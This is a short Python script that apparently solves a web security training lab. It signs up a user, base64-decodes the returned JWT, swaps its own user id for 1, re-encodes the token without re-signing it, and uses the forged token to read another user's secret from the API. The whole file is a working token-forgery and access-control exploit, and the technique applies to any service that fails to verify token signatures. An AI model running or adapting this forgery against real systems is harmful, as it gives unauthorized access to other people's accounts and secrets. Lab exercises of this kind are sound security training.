import requests
import json
import base64
import sys


class Solver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.lab_api_url = self.lab_url.replace('ptl', 'api-ptl')
        self.session = requests.Session()
        self.id = None
        self.token = None

    def signing_up(self):
        data = {
            'user': {
                'email': 'hacker@hacker.com',
                'password': 'Password123@',
                'username': 'hacker'
            }
        }
        response = self.session.post(self.lab_api_url + 'api/users', json=data)
        self.id = json.loads(response.text)['user']['id']
        self.token = json.loads(response.text)['user']['token']

    def generating_malicious_token(self):
        header, payload, signature = self.token.split('.')
        payload += '=' * (len(payload) % 4)
        payload = base64.urlsafe_b64decode(payload)
        payload = payload.replace(str(self.id).encode(), b'1')
        payload = base64.urlsafe_b64encode(payload).rstrip(b'=')
        self.token = header + '.' + payload.decode() + '.' + signature

    def printing_the_key(self):
        self.session.headers.update({'Authorization': f'Token {self.token}'})
        response = self.session.get(self.lab_api_url + 'api/secrets/1')
        print(json.loads(response.text)['secret']['name'] + ': ' + json.loads(response.text)['secret']['value'])

    def start(self):
        self.signing_up()
        self.generating_malicious_token()
        self.printing_the_key()


solver = Solver(sys.argv[1])
solver.start()
